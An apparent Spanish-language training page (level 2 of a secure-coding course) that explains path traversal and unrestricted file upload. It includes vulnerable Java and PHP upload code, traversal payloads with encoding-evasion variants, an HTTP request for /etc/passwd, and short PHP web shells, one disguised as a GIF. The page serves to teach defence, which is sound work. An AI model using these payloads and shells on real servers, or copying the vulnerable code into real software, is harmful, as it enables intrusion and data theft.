@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Nivel 2 · Vulnerabilidad detectada · El Vigilante del Código</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        /* ===== RESET Y BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            color: #444;
+            line-height: 1.7;
+            scroll-behavior: smooth;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem 4rem;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            text-align: center;
+            padding: 2rem 0 1.5rem;
+            border-bottom: 2px solid #e5e5e5;
+            margin-bottom: 2rem;
+        }
+
+        .header .back-link {
+            display: inline-block;
+            margin-bottom: 1rem;
+            color: #dc2626;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .header .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .header .badge {
+            display: inline-block;
+            background: #f5f5f5;
+            color: #666;
+            font-size: 0.7rem;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            padding: 0.3rem 1.2rem;
+            border-radius: 100px;
+            margin-bottom: 1rem;
+            border: 1px solid #e5e5e5;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #444;
+            letter-spacing: -1px;
+            line-height: 1.15;
+        }
+
+        .header h1 .highlight {
+            color: #dc2626;
+        }
+
+        .header .subtitle {
+            font-size: 1rem;
+            color: #666;
+            font-weight: 300;
+            margin-top: 0.3rem;
+        }
+
+        .header .meta {
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: #999;
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .header .meta i {
+            color: #dc2626;
+            margin-right: 0.4rem;
+        }
+
+        /* ===== NAVEGACIÓN ENTRE NIVELES ===== */
+        .level-nav {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.4rem;
+            margin-bottom: 2rem;
+            border-bottom: 2px solid #e5e5e5;
+            padding-bottom: 0.5rem;
+        }
+
+        .level-nav a {
+            background: #f5f5f5;
+            border: 1px solid #e5e5e5;
+            border-bottom: none;
+            padding: 0.4rem 1rem;
+            border-radius: 12px 12px 0 0;
+            font-weight: 600;
+            font-size: 0.75rem;
+            color: #888;
+            text-decoration: none;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .level-nav a.active {
+            background: #ffffff;
+            color: #dc2626;
+            border-color: #dc2626;
+            border-bottom: 2px solid #ffffff;
+            margin-bottom: -2px;
+        }
+
+        .level-nav a .badge-nav {
+            background: #e5e5e5;
+            color: #666;
+            font-size: 0.55rem;
+            padding: 0.05rem 0.5rem;
+            border-radius: 100px;
+        }
+
+        .level-nav a.active .badge-nav {
+            background: #fee2e2;
+            color: #dc2626;
+        }
+
+        .level-nav a i {
+            font-size: 0.75rem;
+        }
+
+        /* ===== CARDS ===== */
+        .card {
+            background: #fafafa;
+            border-radius: 14px;
+            padding: 1.5rem 1.8rem;
+            margin-bottom: 1.2rem;
+            border: 1px solid #e5e5e5;
+            transition: border-color 0.2s;
+        }
+
+        .card:hover {
+            border-color: #ccc;
+        }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 0.6rem;
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+        }
+
+        .card-title i {
+            color: #dc2626;
+        }
+
+        .card-title .emoji-big {
+            font-size: 1.4rem;
+        }
+
+        .card p,
+        .card li {
+            color: #444;
+        }
+
+        .card ul,
+        .card ol {
+            padding-left: 1.3rem;
+            margin: 0.6rem 0;
+        }
+
+        .card li {
+            margin-bottom: 0.3rem;
+        }
+
+        .card code {
+            background: #f0f0f0;
+            padding: 0.15rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.82rem;
+            color: #444;
+            border: 1px solid #e5e5e5;
+        }
+
+        .card .code-block {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 1rem 1.3rem;
+            margin: 0.8rem 0;
+            border: 1px solid #e5e5e5;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.82rem;
+            color: #444;
+            line-height: 1.6;
+        }
+
+        .card .code-block .comment {
+            color: #888;
+            font-style: italic;
+        }
+
+        .card .code-block .keyword {
+            color: #444;
+            font-weight: 600;
+        }
+
+        .card .code-block .string {
+            color: #2563eb;
+        }
+
+        .badge-red {
+            display: inline-block;
+            background: #fee2e2;
+            color: #dc2626;
+            padding: 0.15rem 0.7rem;
+            border-radius: 100px;
+            font-size: 0.65rem;
+            font-weight: 700;
+            margin-left: 0.4rem;
+            border: 1px solid #fca5a5;
+        }
+
+        .badge-yellow {
+            display: inline-block;
+            background: #fef3c7;
+            color: #b45309;
+            padding: 0.15rem 0.7rem;
+            border-radius: 100px;
+            font-size: 0.65rem;
+            font-weight: 700;
+            margin-left: 0.4rem;
+            border: 1px solid #fcd34d;
+        }
+
+        /* ===== TABLAS ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 0.8rem 0;
+        }
+
+        .table-wrap table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.88rem;
+        }
+
+        .table-wrap th {
+            background: #f0f0f0;
+            color: #555;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.65rem;
+            letter-spacing: 0.5px;
+            padding: 0.6rem 1rem;
+            text-align: left;
+            border-bottom: 2px solid #e5e5e5;
+        }
+
+        .table-wrap td {
+            padding: 0.6rem 1rem;
+            border-bottom: 1px solid #e5e5e5;
+            color: #444;
+        }
+
+        .table-wrap tr:hover td {
+            background: #f5f5f5;
+        }
+
+        /* ===== QUIZ ===== */
+        .quiz-container {
+            background: #fafafa;
+            border-radius: 14px;
+            padding: 1.5rem 1.8rem;
+            border: 2px solid #e5e5e5;
+            margin-top: 1.5rem;
+        }
+
+        .quiz-question {
+            font-size: 1.05rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: #444;
+        }
+
+        .quiz-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.6rem;
+            margin-bottom: 1rem;
+        }
+
+        .quiz-option {
+            background: #ffffff;
+            border: 2px solid #e5e5e5;
+            border-radius: 10px;
+            padding: 0.7rem 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .quiz-option:hover:not(.disabled) {
+            border-color: #dc2626;
+            background: #fff5f5;
+        }
+
+        .quiz-option.selected {
+            border-color: #dc2626;
+            background: #fee2e2;
+        }
+
+        .quiz-option.correct {
+            border-color: #16a34a;
+            background: #dcfce7;
+        }
+
+        .quiz-option.wrong {
+            border-color: #dc2626;
+            background: #fee2e2;
+        }
+
+        .quiz-option.partial {
+            border-color: #f59e0b;
+            background: #fef3c7;
+        }
+
+        .quiz-option.disabled {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        .quiz-option .opt-label {
+            font-weight: 700;
+            color: #888;
+            min-width: 1.5rem;
+        }
+
+        .quiz-feedback {
+            padding: 0.8rem 1.2rem;
+            border-radius: 10px;
+            margin: 0.8rem 0;
+            display: none;
+        }
+
+        .quiz-feedback.success {
+            display: block;
+            background: #dcfce7;
+            border-left: 4px solid #16a34a;
+            color: #166534;
+        }
+
+        .quiz-feedback.error {
+            display: block;
+            background: #fee2e2;
+            border-left: 4px solid #dc2626;
+            color: #991b1b;
+        }
+
+        .quiz-feedback.partial {
+            display: block;
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            color: #92400e;
+        }
+
+        .quiz-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 1rem;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+
+        .quiz-nav .question-counter {
+            color: #666;
+            font-size: 0.85rem;
+        }
+
+        .btn {
+            display: inline-block;
+            background: #f0f0f0;
+            border: 1px solid #d1d5db;
+            padding: 0.6rem 1.4rem;
+            border-radius: 999px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #444;
+            text-decoration: none;
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+        }
+
+        .btn-primary {
+            background: #dc2626;
+            border-color: #dc2626;
+            color: #fff;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #b91c1c;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.2);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-success {
+            background: #16a34a;
+            border-color: #16a34a;
+            color: #fff;
+        }
+
+        .btn-success:hover:not(:disabled) {
+            background: #15803d;
+            box-shadow: 0 4px 12px rgba(22, 163, 74, 0.2);
+        }
+
+        .btn-success:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border-color: #dc2626;
+            color: #dc2626;
+        }
+
+        .btn-outline:hover:not(:disabled) {
+            background: #fee2e2;
+        }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: #1a1a1a;
+            color: #fff;
+            padding: 0.6rem 1.2rem;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.3s;
+            pointer-events: none;
+            z-index: 1000;
+            max-width: 350px;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .toast.success {
+            background: #16a34a;
+        }
+
+        .toast.error {
+            background: #dc2626;
+        }
+
+        /* ===== RESULTADOS ===== */
+        .results-container {
+            background: #fafafa;
+            border-radius: 14px;
+            padding: 2rem;
+            border: 2px solid #e5e5e5;
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .results-container .score {
+            font-size: 3.5rem;
+            font-weight: 800;
+            color: #dc2626;
+        }
+
+        .results-container .score-label {
+            font-size: 1.1rem;
+            color: #666;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .mt-2 {
+            margin-top: 1rem;
+        }
+
+        .text-success {
+            color: #16a34a;
+        }
+
+        .text-danger {
+            color: #dc2626;
+        }
+
+        .video-container {
+            margin-top: 1rem;
+            background: #fff;
+            border: 1px solid #e5e5e5;
+            border-radius: 12px;
+            padding: 0.8rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .video-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .video-container a {
+            margin-top: 0.6rem;
+            font-size: 0.9rem;
+            text-align: center;
+            color: #dc2626;
+            text-decoration: none;
+        }
+
+        .video-frame {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 */
+            height: 0;
+            overflow: hidden;
+            width: 100%;
+            border-radius: 10px;
+            margin-top: 0.6rem;
+        }
+
+        .video-frame iframe,
+        .video-frame object,
+        .video-frame embed {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+
+        .video-container a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            .header .subtitle {
+                font-size: 1rem;
+            }
+            .header .meta {
+                flex-direction: column;
+                gap: 0.4rem;
+            }
+            .card {
+                padding: 1rem 1.2rem;
+            }
+            .quiz-options {
+                grid-template-columns: 1fr;
+            }
+            .level-nav {
+                gap: 0.3rem;
+            }
+            .level-nav a {
+                padding: 0.3rem 0.7rem;
+                font-size: 0.7rem;
+            }
+            .level-nav a span {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1rem 0.8rem 3rem;
+            }
+            .header h1 {
+                font-size: 1.5rem;
+            }
+            .quiz-container {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ===== CONTENEDOR ===== -->
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <header class="header">
+            <a href="indice.html" class="back-link"><i class="fas fa-arrow-left"></i> Volver al índice</a>
+            <div class="badge"><i class="fas fa-shield-halved"></i> &nbsp;NIVEL 2</div>
+            <h1><span class="highlight">Vulnerabilidad</span> detectada</h1>
+            <p class="subtitle">Análisis de las debilidades del código</p>
+            <div class="meta">
+                <span><i class="fas fa-clock"></i> 5 preguntas</span>
+                <span><i class="fas fa-star"></i> Mínimo 7/10 para aprobar</span>
+            </div>
+        </header>
+
+        <!-- ===== NAVEGACIÓN ===== -->
+        <nav class="level-nav" id="levelNav">
+            <!-- Generado por JavaScript -->
+        </nav>
+
+        <!-- ===== CONTENIDO EDUCATIVO ===== -->
+         <div class="card">
+            <div class="card-title"><span class="emoji-big"></span><strong>¿Qué es lo que realmente pasó?</strong> </div>
+            <p>Para entender el problema, primero debemos entender cómo funciona un sistema de archivos.</p>
+        
+            
+            <p>En el nivel anterior, vimos un código problemático y cómo un atacante pudo explotarlo. Pero para entender realmente qué pasó, necesitamos profundizar en <strong>cada vulnerabilidad</strong> de forma detallada.</p>
+            
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-file-upload"></i> ¿QUÉ ES UNA VULNERABILIDAD DE CARGA DE ARCHIVOS?</div>
+            <p>Una <strong>vulnerabilidad de carga de archivos</strong> ocurre cuando una aplicación web permite a los usuarios subir archivos sin implementar los controles de seguridad adecuados. Es como tener una puerta en tu casa que cualquiera puede abrir sin llave.</p>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>Razón</th><th>Explicación</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>Acceso directo al servidor</td><td>Los archivos subidos se guardan en el sistema de archivos del servidor</td></tr>
+                        <tr><td>Ejecución de código</td><td>Algunos archivos pueden ser ejecutados por el servidor (PHP, JSP, ASPX)</td></tr>
+                        <tr><td>Acceso a datos sensibles</td><td>Un atacante puede leer, modificar o eliminar archivos</td></tr>
+                        <tr><td>Escalada de privilegios</td><td>Desde un web shell, el atacante puede tomar control total</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-bug"></i> 🔴PATH TRAVERSAL (NAVEGACIÓN DE DIRECTORIOS)</div>
+            <p><strong>¿Qué es exactamente?</strong> Path Traversal (también conocido como Directory Traversal) es una vulnerabilidad que permite a un atacante acceder a archivos y directorios fuera de la carpeta permitida utilizando la secuencia <code>../</code> para "subir" en la estructura de directorios.</p>
+
+            <p><strong>¿Cómo funciona en la práctica?</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">📁 / (Raíz - El tronco principal)
+├── 📁 home
+│   └── 📁 usuario
+│       ├── 📁 documentos
+│       └── 📁 imagenes
+├── 📁 etc
+│   ├── 📄 passwd      ← ¡Archivo importante!
+│   └── 📄 shadow      ← ¡Archivo muy importante!
+├── 📁 var
+│   └── 📁 www
+│       └── 📁 html
+│           └── 📁 uploads    ← ¡Aquí estamos!
+└── 📁 tmp/
+
+(raíz): Es el punto de partida, el "tronco" del árbol.
+.. (doble punto): Significa "sube un nivel en el árbol".
+.(punto): Significa "estoy aquí mismo"</pre>
+            </div>
+
+            <p><strong>Ejemplo Práctico de Ataque</strong></p>
+            <div class="code-block">
+                <span class="comment">// Código vulnerable (Java)</span><br>
+                <span class="keyword">String</span> fileName = request.getParameter("fileName");<br>
+                <span class="keyword">File</span> file = <span class="keyword">new</span> File("/var/www/html/uploads/" + fileName);<br>
+            </div>
+
+            <p><strong>El Ataque:</strong> el atacante envía en <code>fileName</code> el valor <code>../../../../etc/passwd</code>, y la concatenación produce <code>/etc/passwd</code>, exponiendo archivos sensibles.</p>
+
+            <p><strong>Técnicas de evasión que usan los atacantes</strong></p>
+            <div class="table-wrap">
+                <table>
+                    <thead><tr><th>Técnica</th><th>Ejemplo</th><th>Cómo funciona</th></tr></thead>
+                    <tbody>
+                        <tr><td>Codificación URL</td><td>..%2f..%2f</td><td>%2f es '/' codificado en URL</td></tr>
+                        <tr><td>Doble codificación</td><td>..%252f..%252f</td><td>Codifica la codificación</td></tr>
+                        <tr><td>Unicode</td><td>..%c0%af</td><td>Representación alternativa de '/'</td></tr>
+                        <tr><td>Windows</td><td>..\..\windows\win.ini</td><td>Uso de backslash en Windows</td></tr>
+                        <tr><td>Null byte</td><td>../../etc/passwd%00.jpg</td><td>Termina la cadena antes de la extensión</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <p><strong>¿Qué archivos puede leer?</strong></p>
+            <div class="table-wrap">
+                <table>
+                    <thead><tr><th>Sistema</th><th>Archivo</th><th>Información</th></tr></thead>
+                    <tbody>
+                        <tr><td>Linux/Unix</td><td>/etc/passwd</td><td>Usuarios del sistema</td></tr>
+                        <tr><td>Linux/Unix</td><td>/etc/shadow</td><td>Contraseñas hasheadas</td></tr>
+                        <tr><td>Aplicación</td><td>/.env</td><td>Variables de entorno (¡muy peligroso!)</td></tr>
+                        <tr><td>Windows</td><td>C:\\Windows\\win.ini</td><td>Configuración del sistema</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <p><strong>Ejemplo de petición maliciosa (HTTP):</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: vulnerable.com
+User-Agent: Mozilla/5.0
+
+# Respuesta (si es vulnerable):
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+root:x:0:0:root:/root:/bin/bash
+... (contenido de /etc/passwd)</pre>
+            </div>
+
+            <p><strong>Impacto del Path Traversal</strong></p>
+            <ul>
+                <li><span class="badge-red">🔴 Robo de credenciales</span> — lectura de <code>/etc/passwd</code> o <code>/etc/shadow</code></li>
+                <li><span class="badge-red">🔴 Exposición de código fuente</span> — lectura del código de la aplicación</li>
+                <li><span class="badge-red">🔴 Acceso a configuraciones</span> — encuentra contraseñas de bases de datos</li>
+                <li><span class="badge-red">🔴 Exfiltración de datos</span> — roba datos de usuarios</li>
+                <li><span class="badge-red">🔴 Escalada de privilegios</span> —  encuentra formas de obtener más acceso</li>
+            </ul>
+             </div> <h4><i class="fas fa-file-code"></i> Video explicativo</h4>
+                <div class="video-frame">
+               <iframe width="560" height="315" src="https://www.youtube.com/embed/eY_gfuZHsQU?si=gIGBn_UGtguSDQHL" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-upload"></i> 🔴 CARGA DE ARCHIVOS SIN RESTRICCIONES (CWE-434)</div>
+            <p><strong>¿Qué es exactamente?</strong> CWE-434 ocurre cuando una aplicación acepta archivos sin validar adecuadamente su tipo, contenido o ubicación de almacenamiento, permitiendo que los atacantes suban y ejecuten archivos maliciosos.</p>
+
+            <p><strong>¿Cómo funciona el ataque?</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">graph TD
+    A[Atacante] --&gt;|1. Sube archivo malicioso| B[Servidor web]
+    B --&gt;|2. Guarda el archivo| C[Carpeta de uploads]
+    C --&gt;|3. Archivo está disponible| D[URL pública]
+    A --&gt;|4. Accede al archivo| D
+    D --&gt;|5. El servidor ejecuta| E[Código malicioso]
+    E --&gt;|6. Atacante toma control| F[Servidor comprometido]</pre>
+            </div>
+
+            <p><strong>Tipos de archivos peligrosos</strong></p>
+            <div class="table-wrap">
+                <table>
+                    <thead><tr><th>Tipo de Archivo</th><th>Extensión</th><th>Riesgo</th></tr></thead>
+                    <tbody>
+                        <tr><td>Scripts de servidor</td><td>.php, .jsp, .aspx</td><td>Ejecución de código en el servidor</td></tr>
+                        <tr><td>Archivos de configuración</td><td>.htaccess, .ini</td><td>Modificación de configuración</td></tr>
+                        <tr><td>Archivos HTML/JS</td><td>.html, .htm</td><td>XSS almacenado, phishing</td></tr>
+                        <tr><td>Imágenes</td><td>.jpg, .png</td><td>Pueden contener código oculto</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <p><strong>Ejemplo vulnerable (PHP):</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">&lt;?php
+// Define el destino donde se guardará la imagen
+$target = "pictures/" . basename($_FILES['uploadedfile']['name']);
+
+// Mueve el archivo subido a la nueva ubicación
+if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)) {
+    echo "La imagen se ha subido correctamente.";
+} else {
+    echo "Hubo un error al subir la imagen.";
+}
+?&gt;</pre>
+            </div>
+
+            <p><strong>Problemas comunes:</strong> no validar tipo, usar el nombre original, guardar en ubicación accesible y no verificar el contenido real.</p>
+
+            <p><strong>Ejemplo de ataque con web shell</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">&lt;?php
+// shell.php - Web Shell básico
+if (isset($_GET['cmd'])) {
+    echo '&lt;pre&gt;' . shell_exec($_GET['cmd']) . '&lt;/pre&gt;';
+}
+?&gt;
+
+# Acceso:
+https://victima.com/uploads/shell.php?cmd=id
+
+# Ejecución:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-folder-tree"></i> El Sistema de Archivos</div>
+            <p>Piensa en el sistema de archivos de tu computadora o servidor como un <strong>árbol genealógico</strong> de carpetas y archivos.</p>
+            <ul>
+                <li><strong>Raíz</strong> (<code>/</code> en Linux, <code>C:\</code> en Windows): es el punto de partida, el "tronco" principal del árbol.</li>
+                <li><strong>Directorio (Carpeta):</strong> son las "ramas" que contienen otras ramas o archivos. <code>/uploads</code> es un directorio.</li>
+                <li><strong>Archivo:</strong> es la "hoja" en la punta de una rama.</li>
+            </ul>
+            <p>Para encontrar un archivo, necesitas una <strong>ruta</strong>. Por ejemplo, <code>/carpeta/subcarpeta/miarchivo.pdf</code>.</p>
+            <p>Hay dos tipos de rutas:</p>
+            <ol>
+                <li><strong>Ruta Absoluta:</strong> comienza desde la raíz. Ejemplo: <code>/home/usuario/miarchivo.pdf</code>.</li>
+                <li><strong>Ruta Relativa:</strong> comienza desde donde estás parado (tu directorio actual). Ejemplo: <code>miarchivo.pdf</code> si ya estás en <code>/home/usuario/</code>.</li>
+            </ol>
+            <p>Hay dos "trucos" de navegación muy importantes:</p>
+            <ul>
+                <li><strong><code>.</code> (punto):</strong> significa "el directorio donde estoy ahora".</li>
+                <li><strong><code>..</code> (doble punto):</strong> significa "el directorio padre", o sea, "sube un nivel en el árbol".</li>
+            </ul>
+            <p>Si estás en <code>/uploads/</code> y usas <code>..</code>, te mueves a <code>/</code> (la raíz).</p>
+        </div> <h4><i class="fas fa-file-code"></i> Video explicativo</h4>
+                <div class="video-frame">
+              <iframe width="560" height="315" src="https://www.youtube.com/embed/ybcTRrq7_yI?si=_DMBdsK32I3Icv3N" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+
+        <!-- <div class="card">
+            <div class="card-title"><i class="fas fa-door-open"></i> 1. Path Traversal</div>
+            <p>El ataque <strong>Path Traversal</strong>, también llamado <strong>Directory Traversal</strong>, ocurre cuando un atacante usa los <code>..</code> para navegar fuera de la carpeta permitida.</p>
+            <p><strong>Ejemplo práctico:</strong></p>
+            <div class="code-block" style="margin:0.5rem 0;">
+                <span class="comment">// Código problemático que muestra la construcción de la ruta</span><br>
+                <span class="comment">File file = new File("/uploads/" + fileName);</span><br>
+                <span class="comment">// toma el nombre enviado por el usuario y lo concatena sin validarlo</span><br><br>
+                <span class="comment">// Si un atacante envía: ..//..//etc/passwd</span><br>
+                <span class="comment">// El sistema interpreta:</span><br>
+                <span class="comment">// 1. Ve a la carpeta /uploads</span><br>
+                <span class="comment">// 2. Usa .. para subir a la raíz (/)</span><br>
+                <span class="comment">// 3. Luego va a etc/passwd</span><br>
+                <span class="comment">// ¡El servidor intentará acceder a /etc/passwd!</span>
+            </div>
+            <p><code>/etc/passwd</code> es un archivo del sistema operativo que, en servidores mal configurados, contiene información de los usuarios. Un atacante podría leer las contraseñas del servidor.</p><br>
+            <p><span class="badge-red">CRÍTICO</span> Permite leer cualquier archivo al que tenga acceso el servidor, como código fuente, bases de datos o archivos de configuración con contraseñas.</p>
+            <div class="video-container">
+
+                <a href="https://www.youtube.com/watch?v=NmNDpLx4Yvk" target="_blank" rel="noopener noreferrer" style="width:100%;display:block;">
+                    <img src="https://img.youtube.com/vi/NmNDpLx4Yvk/hqdefault.jpg" alt="Vista previa del video sobre Path Traversal" style="width:100%;height:auto;border-radius:10px;display:block;margin:0 auto;">
+                </a>
+                <a href="https://www.youtube.com/watch?v=NmNDpLx4Yvk" target="_blank" rel="noopener noreferrer">Ver video en YouTube</a>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-file-upload"></i> 2. Carga de archivos inseguros</div>
+            <p>No se verifica el tipo de archivo. Un atacante puede subir <code>virus.php</code> y ejecutarlo.</p>
+            <p><span class="badge-red">CRÍTICO</span> Permite ejecutar código en el servidor (RCE - Remote Code Execution), tomando control total de la máquina.</p>
+            <div class="video-container">
+                <a href="https://www.youtube.com/watch?v=ybcTRrq7_yI" target="_blank" rel="noopener noreferrer" style="width:100%;display:block;">
+                    <img src="https://img.youtube.com/vi/ybcTRrq7_yI/hqdefault.jpg" alt="Vista previa del video sobre carga de archivos insegura" style="width:100%;height:auto;border-radius:10px;display:block;margin:0 auto;">
+                </a>
+                <a href="https://www.youtube.com/watch?v=ybcTRrq7_yI" target="_blank" rel="noopener noreferrer">Ver video en YouTube</a>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-user-slash"></i> 3. Sin autenticación</div>
+            <p>Cualquiera puede subir archivos. No se verifica quién es el usuario.</p>
+            <p><span class="badge-yellow">GRAVE</span> Personas no autorizadas pueden subir archivos, introduciendo contenido malicioso en el sistema.</p>
+            <div class="video-container">
+                <a href="https://www.youtube.com/watch?v=0c0yj46Govc" target="_blank" rel="noopener noreferrer" style="width:100%;display:block;">
+                    <img src="https://img.youtube.com/vi/0c0yj46Govc/hqdefault.jpg" alt="Vista previa del video sobre autenticación" style="width:100%;height:auto;border-radius:10px;display:block;margin:0 auto;">
+                </a>
+                <a href="https://www.youtube.com/watch?v=0c0yj46Govc" target="_blank" rel="noopener noreferrer">Ver video en YouTube</a>
+            </div>
+        </div> -->
+
+        <!-- <div class="card">
+            <div class="card-title"><i class="fas fa-weight-scale"></i> 4. Sin límite de tamaño</div>
+            <p>No se restringe el tamaño de los archivos que se pueden subir.</p>
+            <p><span class="badge-yellow">GRAVE</span> Causando una Denegación de Servicio (DoS).</p>
+        </div>
+
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Problema</th><th>¿Qué permite?</th><th>Gravedad</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Path Traversal</td><td>Leer archivos del sistema</td><td><span class="badge-red">MUY GRAVE</span></td></tr>
+                    <tr><td>Archivos inseguros</td><td>Subir virus o programas maliciosos</td><td><span class="badge-red">MUY GRAVE</span></td></tr>
+                    <tr><td>Sin autenticación</td><td>Cualquiera puede subir archivos</td><td><span class="badge-yellow">GRAVE</span></td></tr>
+                    <tr><td>Sin límite de tamaño</td><td>El servidor se queda sin espacio</td><td><span class="badge-yellow">GRAVE</span></td></tr>
+                </tbody>
+            </table>
+        </div> -->
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-skull-crossbones"></i> 🔴  WEB SHELL (EL CABALLO DE TROYA)</div>
+            <p>Un <strong>Web Shell</strong> es un script malicioso que el atacante sube al servidor y que le permite ejecutar comandos del sistema operativo a través del navegador. Es como dejar una puerta trasera en tu servidor.</p>
+
+            <p><strong>Anatomía de un Web Shell</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">graph TD
+    A[Web Shell] --&gt; B[Interfaz Web]
+    A --&gt; C[Ejecución de Comandos]
+    A --&gt; D[Gestión de Archivos]
+    A --&gt; E[Persistencia]</pre>
+            </div>
+
+            <p><strong>Tipos de Web Shells</strong></p>
+            <ul>
+                <li><strong>Básico:</strong> una sola función para ejecutar comandos: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+                <li><strong>Avanzado:</strong> múltiples funciones (cmd, upload, read, delete).</li>
+                <li><strong>Encubierto:</strong> se camufla como imagen (imagen.jpg.php).</li>
+                <li><strong>Persistente:</strong> se reinstala automáticamente si lo borran.</li>
+            </ul>
+
+            <p><strong>Ejemplo de Web Shell encubierto</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;">&lt;?php
+// Este archivo parece una imagen pero es un web shell
+GIF89a;
+&lt;?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?&gt;</pre>
+            </div>
+
+            <p><strong>Impacto</strong>: lectura de archivos, ejecución de comandos, subida/descarga de archivos, persistencia y control total del servidor.</p>
